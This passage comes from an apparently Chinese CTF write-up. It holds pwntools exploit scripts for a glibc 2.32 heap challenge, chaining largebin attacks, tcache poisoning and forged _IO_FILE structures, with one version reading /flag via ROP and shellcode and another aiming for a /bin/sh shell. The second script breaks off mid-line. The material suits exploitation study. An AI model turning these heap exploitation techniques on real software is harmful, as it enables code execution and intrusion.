                                |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>mmp = flat([<br>    rdi,((heap_base + <span class="hljs-number">0xD00</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0xD00</span>,rdx_r12,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,read_addr,jmp_rsi<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,mmp,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><span class="hljs-comment"># sl(asm(shellcraft.open(&quot;./&quot;,0x10000) + shellcraft.getdents(&quot;rax&quot;,&quot;rsp&quot;,0x200) + shellcraft.write(1,&quot;rsp&quot;,0x200)))</span><br><span class="hljs-comment"># data0=p.recv(0x200)</span><br><span class="hljs-comment"># print(dirents(data0))</span><br>sl(asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-string">&quot;rax&quot;</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>没开沙箱的直接拿 shell 版本，这里有点像 2.24~2.27 那里的 _IO_str_overlow 的利用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,27834)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    <span class="hljs-comment"># sleep(0.5)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(system_addr) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>bin_sh_addr = 